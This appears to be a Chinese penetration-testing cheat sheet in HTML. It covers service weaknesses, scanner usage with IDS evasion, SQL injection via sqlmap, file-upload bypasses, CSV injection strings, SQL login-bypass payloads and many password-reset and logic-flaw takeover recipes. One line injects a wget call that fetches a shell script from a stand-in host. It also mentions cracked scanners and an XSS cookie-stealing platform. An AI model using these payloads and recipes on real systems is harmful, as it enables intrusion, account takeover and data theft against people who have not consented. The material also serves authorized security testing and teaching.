+<p><a href="https://localhost:9043/ibm/console/logon.jsp">https://localhost:9043/ibm/console/logon.jsp</a></p>
+<p>Websphere6-7</p>
+<p><a href="http://localhost:9043/ibm/console">http://localhost:9043/ibm/console</a></p>
+<p>后台未授权，登录后可部署WAR包</p>
+<p>SOAP服务有反序列化</p>
+<p>弱口令：admin / password</p>
+<p>11211 / memcache</p>
+<p>未授权</p>
+<p>UDP反射</p>
+<p><a href="https://shockerli.net/post/memcached-udp-reflection-attack-bug/">https://shockerli.net/post/memcached-udp-reflection-attack-bug/</a></p>
+<p>27017,27018 / Mongodb</p>
+<p>未授权</p>
+<p>注入</p>
+<p><a href="https://www.anquanke.com/post/id/83763">https://www.anquanke.com/post/id/83763</a></p>
+<p>phpMoAdmin RCE</p>
+<p><a href="https://www.aqniu.com/threat-alert/6978.html">https://www.aqniu.com/threat-alert/6978.html</a></p>
+<p>50000 / SAP</p>
+<p> SAP命令执行</p>
+<p><a href="https://www.secpulse.com/archives/20204.html">https://www.secpulse.com/archives/20204.html</a></p>
+<p>50070,50030 / hadoop</p>
+<p>未授权</p>
+<p><a href="https://www.freebuf.com/vuls/173638.html">https://www.freebuf.com/vuls/173638.html</a></p>
+<p>命令执行</p>
+<p>host:50060/pstack?pid=123|wget <a href="http://somehost/shell.sh">http://somehost/shell.sh</a></p>
+<p><a href="https://www.seebug.org/search/?keywords=hadoop">https://www.seebug.org/search/?keywords=hadoop</a></p>
+<p>其他</p>
+<p><a href="http://www.91ri.org/15441.html">http://www.91ri.org/15441.html</a></p>
+<h4 id="13wafbypass">1.3WAF及bypass<a class="headerlink" href="#13wafbypass" title="Permanent link">&para;</a></h4>
+<p>探测WAF</p>
+<p>Nmap探测WAF有两种脚本，一种是http-waf-detect，一种是http-waf-fingerprint。</p>
+<p>nmap -p port --script=http-waf-detect ip</p>
+<p>wafw00f -a example.com</p>
+<p>sqlmap-u “<a href="http://www.vxxxx.org/ex.php?id=1">http://www.vxxxx.org/ex.php?id=1</a>” --identify-waf</p>
+<p>bypass:</p>
+<p><strong>待补充</strong></p>
+<h4 id="14_1"><strong>1.4****目录、后台和敏感路径文件扫描</strong><a class="headerlink" href="#14_1" title="Permanent link">&para;</a></h4>
+<p>御剑目录（土司专版，笔记里有）、后台扫描（图片属性地址暴露），</p>
+<p>​    完善目录和账密字典方法：</p>
+<p>​    {</p>
+<p>​       H:\字典；</p>
+<p>​       pydictor新建；</p>
+<p>​       合并后去重复：</p>
+<p>​         dymerge.py -u</p>
+<p>​         python pydictor.py -tool uniqbiner /my/dict/dirpath --output uniq.txt</p>
+<p>​         python pydictor.py -tool uniqifer /tmp/dicts.txt --output /tmp/uniq.txt</p>
+<p>​     }</p>
+<p><strong>2.人工浏览\一个请求一个请求的burp</strong></p>
+<p>**非常**重要,有必要手动去浏览每个页面，点击页面上每一个跳转，这样在Burp的sitemap里面就可以出现这些请求和响应。</p>
+<blockquote>
+<p>！！！手工浏览对于单页应用非常非常重要。自动化的网页爬虫不能够爬到单页应用因为单页应用的HTTP请求都是用异步的AJAX来进行的。</p>
+</blockquote>
+<p>图片后台地址\图片后面的信息</p>
+<p>跳转参数\奇怪的参数</p>
+<p>泄露邮箱等等</p>
+<p>业务逻辑\架构</p>
+<p><strong>3.自动化</strong></p>
+<p>自动化渗透测试框架:(<strong>待补充</strong>)</p>
+<p>Sn1per</p>
+<p>Ary </p>
+<p><a href="evernote:///view/31101406/s32/a569ef3d-46f9-4355-888b-0ebb572f28ec/a569ef3d-46f9-4355-888b-0ebb572f28ec/">Ary自动渗透使用体验</a></p>
+<p>​    </p>
+<h2 id="0x03"><strong>0x03 漏洞挖掘</strong><a class="headerlink" href="#0x03" title="Permanent link">&para;</a></h2>
+<h3 id="1_2"><strong>1.漏洞扫描工具</strong><a class="headerlink" href="#1_2" title="Permanent link">&para;</a></h3>
+<p>注意:登录类网站扫描要带cookies扫才能扫到</p>
+<h4 id="11nikto-web"><strong>1.1Nikto</strong> <strong>Web服务漏洞扫描器</strong><a class="headerlink" href="#11nikto-web" title="Permanent link">&para;</a></h4>
+<p>Tips:利用-Format选项来导出特定格式的扫描结果，使扫描结果更容易阅读和分析。</p>
+<p>nikto -host <a href="">http://example.com</a> -output ~/nikto.html -Format html</p>
+<p>NIKTO使用方法：</p>
+<p>1、命令：nikto -update #升级，更新插件；</p>
+<p>2、Nikto -list-plugins #查看插件；</p>
+<p>3、Nikto -host <a href="http://1.1.1.1/">http://1.1.1.1</a> #扫描目标：域名方式；</p>
+<p>4、Nikto -host <a href="http://1.1.1.1/">http://1.1.1.1</a> -output #扫描并输出结果</p>
+<p>5、Nikto -host 1.1.1.1 -port 80 #扫描目标：ip地址加端口号</p>
+<p>6、Nikto -host <a href="http://www.baidu.com/">www.baidu.com</a> -port 443 -ssl #扫描https网站</p>
+<p>7、Nikto -host 文件名.txt #批量扫描目标</p>
+<p>8、nmap -p80 192.168.1.0/24 -oG - | nikto -host -   #利用nmap扫描开放80端口的IP段并且oG（nmap结果输出并整理）通过管道的方式“|”用nikto进行扫描</p>
+<p>9、nikto -host 192.168.0.1 -useproxy <a href="http://localhost:8070/">http://localhost:8070</a>   #利用代理进行扫描</p>
+<p>10、-vhost   #当一个网站存在多个端口时可以使用-vhost遍历所有网站进行扫描或一个ip对应多个网站</p>
+<p>11、Nikto交互形参数：</p>
+<table>
+<thead>
+<tr>
+<th>空格</th>
+<th>报告当前扫描状态</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>v</td>
+<td>显示详细信息（verbose）</td>
+</tr>
+<tr>
+<td>d</td>
+<td>调试信息（及其详细信息）</td>
+</tr>
+<tr>
+<td>e</td>
+<td>显示错误信息</td>
+</tr>
+<tr>
+<td>p</td>
+<td>显示扫描进度</td>
+</tr>
+<tr>
+<td>r</td>
+<td>显示重定向信息</td>
+</tr>
+<tr>
+<td>c</td>
+<td>显示cookie</td>
+</tr>
+<tr>
+<td>a</td>
+<td>身份认证过程显示出来</td>
+</tr>
+<tr>
+<td>q</td>
+<td>退出</td>
+</tr>
+<tr>
+<td>N</td>
+<td>扫描下一个目标</td>
+</tr>
+<tr>
+<td>P</td>
+<td>暂停扫描</td>
+</tr>
+</tbody>
+</table>
+<p>配置文件：</p>
+<p>路径：/etc/nikto.conf</p>
+<p>User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本；</p>
+<p>在nikto中最好修改成别的浏览器user agent；</p>
+<p>设置cookie：</p>
+<p>在配置文件中找到cookie进行设置（#STATIC-COOKIE= "cookie1"="cookie value";"cookie2"="cookie val"）</p>
+<p>IDS逃避技术：‘</p>
+<p>主要为了躲避IDS、IPS检测告警</p>
+<p><strong>-evasion #此参数使用方式（Nikto -host <a href="http://1.1.1.1/">http://1.1.1.1</a> -evasion 1234）</strong></p>
+<p>逃避方式共8种：</p>
+<p>1、随机url编码，2、自选路径，3、过早结束的URL，4、优先考虑长随机字符串</p>
+<p>5、参数欺骗，6、使用TAB作为命令的分隔符，7、使用变化的URL，8、使用Windows路径分隔符</p>
+<h4 id="12awvs"><strong>1.2****AWVS漏扫</strong><a class="headerlink" href="#12awvs" title="Permanent link">&para;</a></h4>
+<p>这个没什么好说的，破解版到处都是。</p>
+<h4 id="13nessus"><strong>1.3NESSUS</strong><a class="headerlink" href="#13nessus" title="Permanent link">&para;</a></h4>
+<p>实时更新插件的漏扫，很好用，就是激活流程麻烦。</p>
+<p>破解流程：</p>
+<p><a href="【精华】渗透流程归纳_files/nessus破解.pdf"></a></p>
+<h4 id="14xray"><strong>1.4Xray自动化</strong><a class="headerlink" href="#14xray" title="Permanent link">&para;</a></h4>
+<p>自动化的漏洞挖掘</p>
+<p>burp+xray：</p>
+<p><a href="evernote:///view/31101406/s32/5c2c96e9-106b-4004-a7fa-d26ac849b4ab/5c2c96e9-106b-4004-a7fa-d26ac849b4ab/">BurpSuite + Xray 被动扫描配置 - Ritte - 博客园</a></p>
+<p>或者直接挂浏览器，点到哪里，扫到哪里</p>
+<h4 id="15fuzz"><strong>1.5Fuzz</strong><a class="headerlink" href="#15fuzz" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th><strong>名 称</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Burp Engagement Tools</td>
+<td>Burp Suite Pro中自带的有特殊用途的工具集</td>
+</tr>
+<tr>
+<td>Engagement Tool: Discover Content</td>
+<td>Burp Suite Pro自带的用于强制浏览的工具</td>
+</tr>
+<tr>
+<td>Burp Intruder</td>
+<td>Burp Suite中可自定义的用于自动化的攻击的模块。(比如brute forcing, injection等)</td>
+</tr>
+<tr>
+<td>FuzzDB</td>
+<td>包含各种恶意输入、资源名、用于grep搜索响应内容的字符串、Webshell等。</td>
+</tr>
+</tbody>
+</table>
+<p>Fuzz可以发现应用程序中没有被引用但是确实是可以访问的页面。</p>
+<p>Discover Content是Burp中专门用于此目的的工具。</p>
+<p>除此之外，Burp Intruder也可以通过字典攻击来实施强制浏览(通常是在url参数和文件路径部分进行修改)。</p>
+<p>FuzzDB包含一些用于此目的的非常牛逼的字典，可以在<a href="https://github.com/fuzzdb-project/fuzzdb/tree/master/discovery">这里</a>看看。</p>
+<h4 id="_2"><a class="headerlink" href="#_2" title="Permanent link">&para;</a></h4>
+<h3 id="2"><strong>2.手动挖掘</strong><a class="headerlink" href="#2" title="Permanent link">&para;</a></h3>
+<h4 id="21sql"><strong>2.1SQL注入：</strong><a class="headerlink" href="#21sql" title="Permanent link">&para;</a></h4>
+<p>初步测试：</p>
+<p>见框就上，加' " ) ))% and 1=1 and 1=2，</p>
+<p>抓包爆破常用SQL注入payload</p>
+<p>通过搜索引擎，批量查找注入点，详见笔记。</p>
+<p>然后用傀儡注入点批量搜集工具</p>
+<p>实操案例：</p>
+<p><a href="evernote:///view/31101406/s32/38a37a03-e23b-4ed5-ac81-dd183bce1788/38a37a03-e23b-4ed5-ac81-dd183bce1788/">sql注入思路（登录界面）和网络常用端口_u011975363的专栏-CSDN博客</a></p>
+<p>​        超级SQL注入工具（github）</p>
+<p>sqlmap一把梭：</p>
+<p>注意：命令为kali linux中运行的 （windows中用python sqlmap.py执行）</p>
+<h5 id="1_3">1#、注入六连：<a class="headerlink" href="#1_3" title="Permanent link">&para;</a></h5>
+<p>1.sqlmap -u "<a href="http://www.xx.com/?id=x">http://www.xx.com?id=x</a>"  【查询是否存在注入点</p>
+<p>2.--dbs     【检测站点包含哪些数据库</p>
+<p>3.--current-db   【获取当前的数据库名</p>
+<p>4.--tables -D "db_name" 【获取指定数据库中的表名 -D后接指定的数据库名称</p>
+<p>5.--columns -T "table_name" -D "db_name" 【获取数据库表中的字段</p>
+<p>6.--dump -C "columns_name" -T "table_name" -D "db_name" 【获取字段的数据内容</p>
+<h5 id="2cookie">2#、COOKIE注入：<a class="headerlink" href="#2cookie" title="Permanent link">&para;</a></h5>
+<p>sqlmap -u "<a href="http://www.xx.com/?id=x">http://www.xx.com</a>/xxx.asp" --cookie "id=XXX  cookie" --level 2 【cookie注入 后接cookie值</p>
+<h5 id="3post">3#、POST注入：<a class="headerlink" href="#3post" title="Permanent link">&para;</a></h5>
+<p>（1）目标地址http:// <a href="http://www.xxx.com/">www.xxx.com</a> /login.asp</p>
+<p>（2）打开burp代理</p>
+<p>（3）点击表单提交</p>
+<p>（4）burp获取拦截信息（post）</p>
+<p>（5）右键保存文件（.txt）到指定目录下</p>
+<p>（6）运行sqlmap并执行如下命令：</p>
+<p>用例：sqlmap -r okay.txt -p username</p>
+<p>// -r表示加载文件(及步骤（5）保存的路径)，-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）</p>
+<p>（7）自动获取表单：--forms自动获取表单</p>
+<p>例如：sqlmap -u <a href="http://www.xx.com/login.asp">www.xx.com/login.asp</a> --forms</p>
+<p>（8）指定参数搜索：--data</p>
+<p>例如:sqlmap -u <a href="http://www.xx.com/login.asp">www.xx.com/login.asp</a> --data "username=1"</p>
+<h5 id="4">4#、常用指令：<a class="headerlink" href="#4" title="Permanent link">&para;</a></h5>
+<p>\1.   --purge   【重新扫描（--purge 删除原先对该目标扫描的记录）</p>
+<p>\2.  --tables   【获取表名</p>
+<p>\3.   --dbs     【检测站点包含哪些数据库</p>
+<p>\4.   --current-db   【获取当前的数据库名</p>
+<p>\5.   --current-user 【检测当前用户</p>
+<p>\6.  --is-dba  【判断站点的当前用户是否为数据库管理员</p>
+<p>\7.  --batch   【默认确认，不询问你是否输入</p>
+<p>\8.  --search 【后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D）</p>
+<p>\9.  --threads 10 【线程，sqlmap线程最高设置为10</p>
+<p>\10. --level 3    【sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头</p>
+<p>​                的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5</p>
+<p>\11. --risk 3      【执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全</p>
+<p>\12.   -v  【详细的等级(0-6)</p>
+<p>​     0：只显示Python的回溯，错误和关键消息。</p>
+<p>​     1：显示信息和警告消息。</p>
+<p>​      2：显示调试消息。</p>
+<p>​      3：有效载荷注入。</p>
+<p>​      4：显示HTTP请求。</p>
+<p>​     5：显示HTTP响应头。</p>
+<p>​     6：显示HTTP响应页面的内容</p>
+<p>\13.  --privileges 【查看权限</p>
+<p>\14.  --tamper xx.py,cc.py  【防火墙绕过，后接tamper库中的py文件</p>
+<p>\15. --method "POST" --data "page=1&amp;id=2"  【POST方式提交数据</p>
+<p>\16. --threads number　　【采用多线程 后接线程数</p>
+<p>\17. --referer "" 【使用referer欺骗</p>
+<p>\18. --user-agent ""   【自定义user-agent</p>
+<p>\19. --proxy “目标地址″  【使用代理注入</p>
+<p>sqlmap常用路径：</p>
+<p>\1. 添加表字段的目录在/usr/share/sqlmap/txt/common-tables.txt</p>
+<p>\2. 存放扫描记录的目录在/root/.sqlmap/output</p>
+<p>高阶玩法：</p>
+<p>自己写tamper.py</p>
+<h4 id="22xss"><strong>2.2XSS跨站脚本攻击：</strong><a class="headerlink" href="#22xss" title="Permanent link">&para;</a></h4>
+<p><a href="evernote:///view/31101406/s32/0f251923-9d95-46c5-8a2b-680ce18061c9/0f251923-9d95-46c5-8a2b-680ce18061c9/">xss漏洞原理分析与挖掘方法 - 知乎</a></p>
+<p><a href="evernote:///view/31101406/s32/c527e103-df3d-49a9-89f0-f707580f26e3/c527e103-df3d-49a9-89f0-f707580f26e3/">web漏洞 | XSS（跨站攻击脚本）详解</a></p>
+<p><a href="evernote:///view/31101406/s32/bc22dbb9-d81f-4993-9fa1-8f4b7be09a9c/bc22dbb9-d81f-4993-9fa1-8f4b7be09a9c/">XSS汇总</a></p>
+<p><a href="evernote:///view/31101406/s32/c5251a02-20b4-4122-b33f-f1cb9b74085d/c5251a02-20b4-4122-b33f-f1cb9b74085d/">XSS小结 - 先知社区</a></p>
+<p>[2020跨站点脚本<a href="evernote:///view/31101406/s32/395bb46a-95fc-47f6-9939-78e4e58c6559/395bb46a-95fc-47f6-9939-78e4e58c6559/">xss]速查表|雨苁</a></p>
+<p>XSSer自动化工具</p>
+<p>XSStrike 自动化绕过WAF</p>
+<p>xss payload字典 burp爆破</p>
+<p>客服对话系统上XSS打cookie</p>
+<p>搭建XSS平台</p>
+<h4 id="23_1"><strong>2.3文件上传</strong><a class="headerlink" href="#23_1" title="Permanent link">&para;</a></h4>
+<p>​         字典生成 <a href="https://github.com/c0ny1/upload-fuzz-dic-builder">https://github.com/c0ny1/upload-fuzz-dic-builder</a></p>
+<p>​         畸形文件名</p>
+<p>​             Windows</p>
+<p>​                  shell.php{%80-%99}</p>
+<p>​                  NTFS ADS特性</p>
+<p>​                       shell.php......</p>
+<p>​                       shell.php::$DATA</p>
+<p>​                        shell.php:a.jpg</p>
+<p>​        目录穿越</p>
+<p>​             上传后如果没有被文件重命名，可以在文件名值做目录跳转</p>
+<p>​             注意一些像目录的参数名</p>
+<p>​                     dir</p>
+<p>​                     path</p>
+<p>​                     location</p>
+<p>​                     url</p>
+<p>​             文件头绕过</p>
+<p>​             修改上传类型 Content-Type</p>
+<p>双文件上传</p>
+<p>截断</p>
+<p>•   长文件名</p>
+<p>•   长Content-Disposition</p>
+<p>•   %00截断</p>
+<p>特殊文件</p>
+<p>•   svg / html / htm / swf</p>
+<p>•   xss</p>
+<p>•   pdf</p>
+<p>•   chrome 里可以跳转</p>
+<p>cer / asa / spx / php5 / phtml</p>
+<p>•   可能会被当做动态语言解析</p>
+<p>.htaccess / .user.ini / web.config / web.xml</p>
+<p>•   修改解析规则</p>
+<p>.xls / .xlsx</p>
+<p>•   POI Excel XXE</p>
+<p>.tar / .tar.gz / .zip</p>
+<p>•   可能存在文件释放目录跳转问题</p>
+<p>.pkl</p>
+<p>•   python反序列化文件</p>
+<p>.xml</p>
+<p>•   可能有 XXE</p>
+<p>.yaml / .yml</p>
+<p>•   YAML 反序列化</p>
+<p>.jar / .class</p>
+<p>•   上传到 java classpath 的目录下，类被加载时执行代码</p>
+<p>无大小和次数限制</p>
+<p>•   无限上传制造垃圾数据堵死硬盘</p>
+<p>有图片加工的地方可以注意一下imagemagick命令执行</p>
+<p>文件读取</p>
+<p>读取系统敏感文件</p>
+<p>文件包含</p>
+<p>可读取文件或代码执行</p>
+<p>文件删除</p>
+<p>删除配置文件可破坏网站</p>
+<p>删除安装锁可重装</p>
+<p>文件解压</p>
+<p>如果上传文件为 tar / tar.gz 类型，可以尝试构压缩包内文件名为../../../../xxx 的tar包</p>
+<p>文件导出</p>
+<p>如果是CSV 或者 Excel可以注意一下CSV注入</p>
+<p>=2222-1</p>
+<p>-1+1=2222-1</p>
+<p>@=2222-1</p>
+<p>\r\n=2222-1</p>
+<p>111,=2222-1,</p>
+<h4 id="24"><strong>2.4命令执行</strong><a class="headerlink" href="#24" title="Permanent link">&para;</a></h4>
+<p>•   命令注入</p>
+<p>•   --xxxx 参数注入</p>
+<p>•   | 和 | | 与符号</p>
+<p>•   &amp; 和 &amp;&amp; 与符号</p>
+<p>•   ; 分号</p>
+<p>•   ${}</p>
+<p>代码执行</p>
+<p>•   表达式</p>
+<p>•   freemarker</p>
+<p>•   OGNL</p>
+<p>•   Spel</p>
+<p>•   jsel</p>
+<p>•   非表达式</p>
+<p>•   php</p>
+<p>•   eval</p>
+<p>•   assert</p>
+<p>•   call_user_func() / call_user_func_array()</p>
+<p>•   preg_replace()</p>
+<p>•   create_function()</p>
+<p>•   array_map()</p>
+<p>•   array_filter()</p>
+<p>•   usort() / uasort()</p>
+<p>•   反序列化</p>
+<p>•   php 源文件拼接写入</p>
+<p>•   java</p>
+<p>•   反序列化</p>
+<p>•   远程 jar 加载</p>
+<p>•   反射机制</p>
+<p>•   jsp 源文件拼接写入</p>
+<h4 id="25"><strong>2.5弱口令及字典破解</strong><a class="headerlink" href="#25" title="Permanent link">&para;</a></h4>
+<p>后台弱口令爆破撞库（尝试万能密码、特定资产常用密码、弱口令后再撞库）</p>
+<p>asp aspx万能密码</p>
+<p>1： "or "a"="a</p>
+<p>2： ')or('a'='a</p>
+<p>3：or 1=1--</p>
+<p>4：'or 1=1--</p>
+<p>5：a'or' 1=1--</p>
+<p>6： "or 1=1--</p>
+<p>7：'or'a'='a</p>
+<p>8： "or"="a'='a</p>
+<p>9：'or''='</p>
+<p>10：'or'='or'</p>
+<p>11: 1 or '1'='1'=1</p>
+<p>12: 1 or '1'='1' or 1=1</p>
+<p>13: 'OR 1=1%00</p>
+<p>14: "or 1=1%00</p>
+<p>15: 'xor</p>
+<p>16: 新型万能登陆密码</p>
+<p>用户名 ' UNION Select 1,1,1 FROM admin Where ''=' （替换表名admin）</p>
+<p>密码 1</p>
+<p>Username=-1%cf' union select 1,1,1 as password,1,1,1 %23</p>
+<p>Password=1</p>
+<p>17..admin' or 'a'='a 密码随便</p>
+<p>PHP万能密码</p>
+<p>'or'='or'</p>
+<p>'or 1=1/* 字符型 GPC是否开都可以使用</p>
+<p>User: something</p>
+<p>Pass: ' OR '1'='1</p>
+<p>jsp 万能密码</p>
+<p>1'or'1'='1</p>
+<p>admin' OR 1=1/*</p>
+<p>用户名：admin 系统存在这个用户的时候 才用得上</p>
+<p>密码：1'or'1'='1</p>
+<p>pydictor、cupp、crunch字典生成工具、自写字典生成py（小黑的人名字典py）；</p>
+<p>dymerge字典合并去重工具、自己写去重py；</p>
+<p><strong>hydra爆破工具</strong></p>
+<p>超级弱口令检验工具</p>
+<p>burpsuite 爆破</p>
+<p>使用弱用户名对密码进行暴力破解</p>
+<p>使用弱口令密码对用户名进行暴力破解</p>
+<h4 id="26"><strong>2.6逻辑漏洞</strong><a class="headerlink" href="#26" title="Permanent link">&para;</a></h4>
+<h6 id="cookie">Cookie<a class="headerlink" href="#cookie" title="Permanent link">&para;</a></h6>
+<p>一些网站会利用 Cookie 是否为空、Session 是否为 true 来判断用户是否可以登录，只要构造一个 Cookie 或 Session 为 true 就可以绕过认证登录</p>
+<p>通过修改 Cookie 中的某个参数来实现登录其他用户,要抓包具体分析</p>
+<p>数据篡改</p>
+<p>数量、金额、ID、邮箱等数据：最大超过限制、负数、0、其他用户数据，提交后查看是否进入正常业务流程，是否存在越权</p>
+<p>例子：</p>
+<p>修改普通用户密码，抓包</p>
+<p>将 Referer 和 POST 中的普通用户改成 admin</p>
+<p>提交数据后，直接返回了 admin 的密码修改页面，利用逻辑漏洞获取超级权限</p>
+<p>抓包修改手机号参数为其他号码进行尝试，例如办理查询页面，输入自己的号码然后抓包，修改手机号为他人号码，查看是否可以查询他人业务</p>
+<p>手机号 篡改</p>
+<p>邮箱或者用户 篡改</p>
+<p>订单ID 篡改</p>
+<p>商品编号 篡改</p>
+<p>用户ID 篡改</p>
+<p>金额 篡改</p>
+<p>商品数量 篡改</p>
+<h6 id="_3"><strong>验证码绕过</strong><a class="headerlink" href="#_3" title="Permanent link">&para;</a></h6>
+<p>drop掉页面</p>
+<p>返回包里可能就有验证码</p>
+<p>一次验证码多用</p>
+<p>验证码识别插件，burp</p>
+<p>注册界面：</p>
+<p>​     任意用户注册</p>
+<p>​     可爆破用户名 </p>
+<p>​     注入</p>
+<p>​     XSS</p>
+<p><strong>登录界面</strong>：</p>
+<p>​    爆破用户名、密码</p>
+<p>​     注入</p>
+<p>​    万能密码 </p>
+<p>​    Xss Xss+Csrf </p>
+<p>​    修改返回包信息，登入他人账户 </p>
+<p>​    修改cookie中的参数，如user,adminid等</p>
+<p><strong>忘记密码界面</strong>：</p>
+<p>任意密码重置概要：</p>
+<p>​    1．重置一个账户，不发送验证码，设置验证码为空发送请求。 </p>
+<p>​    2．发送验证码，查看相应包 </p>
+<p>​    3．验证码生存期的爆破 </p>
+<p>​    4．修改相应包为成功的相应包 </p>
+<p>​    5．手工直接跳转到校验成功的界面 </p>
+<p>​    6．两个账户，重置别人密码时，替换验证码为自己正确的验证码 </p>
+<p>​    7．重置别人密码时，替换为自己的手机号 </p>
+<p>​    8．重置自己的成功时，同意浏览器重置别人的，不发验证码 </p>
+<p>​    9．替换用户名，ID，cookie，token参数等验证身份的参数 </p>
+<p>10．通过越权修改他人的找回信息如手机/邮箱来重置</p>
+<p><strong>用户凭证暴力破解</strong>（验证码）</p>
+<p>绕过的话，这里可以考虑一个现状：</p>
+<p>例如：</p>
+<p>phone=18888888888abc</p>
+<p>国内很多情况下都没有过滤字符和限制输出长度，验证很有可能只是简单的处理</p>
+<p>只要更换手机号后面的字符，就可以绕过请求过于频繁的限制</p>
+<p>但是校验时，手机号后面的字符会被过滤，也就是可以利用暴力破解验证码（不计入次数）</p>
+<p>所以只要在暴力破解的同时，改变手机号后面的字符即可达到漏洞效果</p>
+<p>根据手机号找回密码，但是验证次数被限制，抓包</p>
+<p>可以尝试在手机号后面添加不为数字的字符，查看是否过滤</p>
+<p>根据手机号找回密码，随便输个验证码，抓包</p>
+<p>暴力破解验证码（假如只有四位），很快就可以破解出来</p>
+<p>四位或六位纯数字，验证码次数未限制</p>
+<p>例如：</p>
+<p>如果验证码次数限制，破解一会就会提示请求过于频繁，这时就需要绕过限制</p>
+<p>例如：</p>
+<p>通过密保问题找回密码，查看源码，密保问题和答案就在源码中显示</p>
+<p>返回凭证（验证码 及 token）、邮箱弱 token、用户凭证有效性、重新绑定</p>
+<p>抓包，可以发现返回的数据中有一个加密的字符串（token），先记录下这个加密字符串</p>
+<p>继续按照正常流程，登录邮箱获得验证码，返回填写验证码后，进入下一个填写新密码页面，发现 URL 后新增了一个加密验证的字符串</p>
+<p>这个字符串就是之前数据包中记录的字符串，所以邮箱验证码这个环节可以绕过，直接用他人邮箱抓包获得加密字符串就可以重置他人密码</p>
+<p>根据手机号找回密码，抓包，可以发现验证码直接显示 verifycode=xxxx，或者由 md5 加密后显示，解密即可（同理，有的时候输入用户名，抓包可以看到返回的手机号等其他信息）</p>
+<p>根据邮箱找回密码,抓包直接返回,密码找回凭证可能在页面中</p>
+<p>例如：</p>
+<p>利用两个帐号同时点击找回密码，去邮箱查看找回密码的链接，发现两者的随机 token 只差 1-2，而且可以猜测出为服务器时间</p>
+<p>所以可以用一个未知帐号和一个已知帐号同时点击找回密码，稍微遍历一下随机 token，就可以构造出未知帐号的密码找回链接</p>
+<p>例如：</p>
+<p>通过邮箱找回密码，正常流程去邮箱查看重置密码链接，发现链接处有一串 md5 加密字符串</p>
+<p>字符串解密，类似 1491293277（10位），可以判断为 Unix时间戳，（可能md5）</p>
+<p>重置他人密码只需要利用他人邮箱发送重置密码邮箱，在短时间内对 Unix时间戳 进行暴力破解，即可获得重置密码的链接</p>
+<p>重置密码链接直接使用用户名来区别，改变用户名即可更改他人密码</p>
+<p>绕过**token**</p>
+<p>正常流程下，对每个功能模块进行抓包，分别是发送验证码，验证验证码是否正确，获取 token，重置密码</p>
+<p>接下来，用他人帐号通过邮箱验证，抓包，将其中 Cookie 内从 JSESSIONID 开始的内容替换至正常流程的发生验证码包内，同时替换自己接受验证码的邮箱，提交</p>
+<p>通过邮箱获取验证码后，将验证码、Cookie、他人帐号、自己邮箱替换至验证验证码模块，提交（不用在意返回是否错误）</p>
+<p>继续替换内至获取 token 模块，提交获取 token</p>
+<p>最后将获取的 token 和上面的内容替换至最后的重置密码模块，提交成功修改密码</p>
+<p>例如：</p>
+<p>通过邮箱找回密码，访问链接重置密码，输入新密码后提交时抓包，虽然有 token，但是依然可以直接修改 用户ID 进而修改他人密码</p>
+<p>例如：</p>
+<p>通过他人手机号找回密码，抓包，将他人手机号替换成自己的手机号，获取验证码，提交后修改密码</p>
+<p>通过自己手机号找回密码，获取验证码后抓包，将数据包中的 username 改为他人用户名，提交后成功修改他人密码</p>
+<p>短信验证码、邮箱 token、重置密码 token</p>
+<p>例如：</p>
+<p>通过邮箱找回密码，URL 链接中修改 用户ID 为他人，邮箱不变，之后通过链接可以将他人账户绑定为自己的邮箱，之后通过邮箱找回密码</p>
+<p>例如：</p>
+<p>给已知账户绑定手机，发现绑定手机的 URL 链接中有 uid 参数，修改 uid 参数为他人的，即可实现将他人的账户绑定上自己的手机，之后通过手机来修改密码</p>
+<p>修改个人资料处抓包，修改 userId 为他人，修改 mobilePhone 为自己的手机，即可实现将他人的账户绑定上自己的手机，之后通过手机来修改密码</p>
+<p>手机绑定、邮箱绑定</p>
+<p>例如：</p>
+<p>通过密码保护问题找回密码，抓包，将密码保护问题删除，直接修改密码，提交</p>
+<p>注：此处密保问题和新密码在同一页面</p>
+<p>例如：</p>
+<p>正常流程，通过手机号提交验证码找回密码处抓包，记录下这个包的内容</p>
+<p>通过已知用户名找回密码，查看源代码可以发现用户其他信息（比如：手机号、邮箱）</p>
+<p>通过发现的手机号选择通过手机找回密码，随便输入短信验证码，抓包</p>
+<p>修改之前记录下的包的内容，将其中 Session id、用户ID 修改为刚刚从其他用户名抓包获得的内容，提交这个包，即可成功修改他人密码</p>
+<p>最终提交步骤</p>
+<p>例如：</p>
+<p>通过邮箱找回密码，最后通过链接至修改密码页面，修改密码后提交，抓包，获得 Uid 参数，修改为他人，即可修改其他用户密码</p>
+<p>服务器验证的验证逻辑为空（绕过认证）</p>
+<p>例如：</p>
+<p>通过邮箱找回密码，点击请重新发送邮件处抓包，将邮箱改为自己的邮箱，通过链接成功修改密码</p>
+<p>例如：</p>
+<p>通过手机找回密码，输入验证码和新的密码，F12 审查元素，修改自己的手机为他人手机，提交成功修改他人手机（也可以抓包修改）</p>
+<p>例如：</p>
+<p>正常流程下，密码找回，查看最后设置新密码页面的 URL，记录下来</p>
+<p>继续返回密码找回处，输入其他用户名，提交找回申请，直接访问上面记录下的修改密码页面，成功修改密码</p>
+<p>也可以正常流程下，修改密码页面抓包，修改其中的 USERNAME_COOKIE 为其他用户（有可能会经过编码，比如 base64），提交即可修改其他用户密码</p>
+<p>如果抓包其中有 step 参数，可以修改这个参数为最后一步（比如：5），提交便可略过之前的步骤</p>
+<p>跳过验证步骤、找回方式、直接到设置新密码页面</p>
+<p>例如：</p>
+<p>通过用户名找回密码，提交后会自动发送验证码到手机中，所以抓包，修改手机为自己的手机（如果其中有 type 之类的参数，也可以尝试修改，有 email之类的参数，可以尝试删除内容）</p>
+<p>发送修改后的包，手机成功接收验证码</p>
+<p>输入验证码，继续发送，抓包，如果有 type 之类的参数，可以继续尝试修改，发送就可以成功修改密码</p>
+<p>例如：</p>
+<p>通过手机找回密码，随便输入验证码，抓包，发送，拦截返回包</p>
+<p>修改返回包中的返回码，继续发送，说不定就可以绕过验证，直接跳到修改密码的页面</p>
+<p>通过手机找回密码，正常流程下到重置密码页面，抓包查看返回数据中有一段加密字符串</p>
